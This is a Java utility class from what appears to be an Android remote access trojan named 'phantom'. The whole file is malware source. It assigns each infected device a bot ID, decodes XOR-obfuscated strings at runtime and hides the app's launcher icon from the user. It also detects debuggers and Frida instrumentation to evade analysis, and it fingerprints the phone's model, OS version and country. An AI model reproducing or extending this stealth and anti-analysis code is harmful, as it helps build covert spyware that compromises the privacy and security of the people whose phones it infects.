package com.phantom.rat;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.TelephonyManager;

import java.io.File;
import java.io.RandomAccessFile;
import java.util.Locale;
import java.util.UUID;

public final class FudUtils {
    private static final String KEY = "Ph4nt0m";

    private FudUtils() {}

    public static String botId(Context ctx) {
        String id = ctx.getSharedPreferences("phantom", Context.MODE_PRIVATE).getString("bot_id", "");
        if (id.isEmpty()) {
            id = "P7X-" + UUID.randomUUID().toString().substring(0, 8).toUpperCase(Locale.US);
            ctx.getSharedPreferences("phantom", Context.MODE_PRIVATE).edit().putString("bot_id", id).apply();
        }
        return id;
    }

    /** Runtime string decryption (XOR + obfuscated at build time). */
    public static String x(String s) {
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) sb.append((char) (s.charAt(i) ^ KEY.charAt(i % KEY.length())));
        return sb.toString();
    }

    public static String config(Context ctx, String key, String def) {
        try {
            String raw = new String(ctx.getAssets().open("config.json").readAllBytes(), "UTF-8");
            return new org.json.JSONObject(raw).optString(key, def);
        } catch (Exception e) {
            return def;
        }
    }

    public static void hideIcon(Context ctx) {
        ComponentName cn = new ComponentName(ctx, MainActivity.class);
        ctx.getPackageManager().setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public static void showIcon(Context ctx) {
        ComponentName cn = new ComponentName(ctx, MainActivity.class);
        ctx.getPackageManager().setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static boolean isDebugged() {
        if (android.os.Debug.isDebuggerConnected()) return true;
        try (RandomAccessFile raf = new RandomAccessFile("/proc/self/status", "r")) {
            String line;
            while ((line = raf.readLine()) != null) {
                if (line.startsWith("TracerPid:") && !line.endsWith("0")) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    public static boolean fridaPresent() {
        try {
            if (new File("/data/local/tmp/frida-server").exists()) return true;
            try (RandomAccessFile raf = new RandomAccessFile("/proc/self/maps", "r")) {
                byte[] buf = new byte[(int) Math.min(raf.length(), 4 * 1024 * 1024)];
                raf.readFully(buf);
                String s = new String(buf);
                return s.contains("frida") || s.contains("gadget");
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static String model() { return Build.MODEL == null ? "" : Build.MODEL; }
    public static String androidVer() { return Build.VERSION.RELEASE == null ? "" : Build.VERSION.RELEASE; }

    public static String country(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String c = tm.getSimCountryIso();
                if (c != null && !c.isEmpty()) return c.toUpperCase(Locale.US);
                String n = tm.getNetworkCountryIso();
                if (n != null && !n.isEmpty()) return n.toUpperCase(Locale.US);
            }
        } catch (Exception ignored) {}
        return Locale.getDefault().getCountry().toUpperCase(Locale.US);
    }
}
